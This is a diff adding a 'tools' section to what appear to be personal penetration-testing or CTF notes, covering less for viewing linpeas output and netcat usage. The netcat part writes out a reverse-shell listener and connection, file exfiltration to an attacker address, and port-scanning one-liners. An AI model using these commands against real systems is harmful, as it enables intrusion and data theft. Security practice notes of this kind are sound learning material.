@@ -29,6 +29,9 @@
   * [basics](#basics)
     * [windows](#windows-2)
     * [linux](#linux-2)
+* [tools](#tools)
+  * [less](#less)
+  * [nc](#nc)
 
 <!-- vim-markdown-toc -->
 
@@ -284,3 +287,46 @@ xdotool # fake keyboard mouse in X.
 ```
 
 </details>
+
+# tools
+
+## less
+
+examples:
+
+```sh
+./linpeas.sh | less -R # read raw control chars (colors).
+```
+
+* less uses many vim bindings
+* press `h` for help
+* press `s` to save to a file
+* `Gg` scrolls to the bottom and back up, now you can use `^g` to show progress!
+
+## nc
+
+> reverse shell
+```sh
+# attacker:
+nc -lnvp 12345
+
+# attackee:
+nc 10.10.14.69 12345
+```
+
+> exfiltration
+```sh
+# attacker:
+nc -lnvp 12345 > exfil_file
+
+# attackee:
+nc -q0 10.10.14.69 12345 < exfil_file
+```
+
+> check for open port
+```sh
+nc -zv localhost 80
+
+# or a range
+nc -zv localhost 1-1024 2>/dev/null
+```
